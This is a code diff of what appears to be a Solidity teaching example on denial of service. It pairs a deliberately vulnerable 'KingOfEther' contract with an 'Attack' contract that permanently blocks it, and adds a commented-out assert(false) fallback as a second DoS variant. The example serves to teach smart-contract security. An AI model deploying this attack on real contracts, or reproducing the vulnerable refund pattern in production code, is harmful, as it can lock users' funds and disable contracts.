@@ -23,13 +23,13 @@ Ether sent from KingOfEther before the new king is set.
 contract KingOfEther {
     address public king;
     uint public balance;
-    
+
     function claimThrone() external payable {
         require(msg.value > balance, "Need to pay more to become the king");
-        
+
         (bool sent, ) = king.call.value(balance)("");
         require(sent, "Failed to send Ether");
-        
+
         balance = msg.value;
         king = msg.sender;
     }
@@ -37,11 +37,19 @@ contract KingOfEther {
 
 contract Attack {
     KingOfEther kingOfEther;
-    
+
     constructor(KingOfEther _kingOfEther) public {
         kingOfEther = KingOfEther(_kingOfEther);
     }
-    
+
+    // You can also perform a DOS by consuming all gas using assert.
+    // This attack wil work even if the calling contract does not check
+    // whether the call was successful or not.
+    //
+    // function () external payable {
+    //     assert(false);
+    // }
+
     function attack() public payable {
         kingOfEther.claimThrone.value(msg.value)();
     }
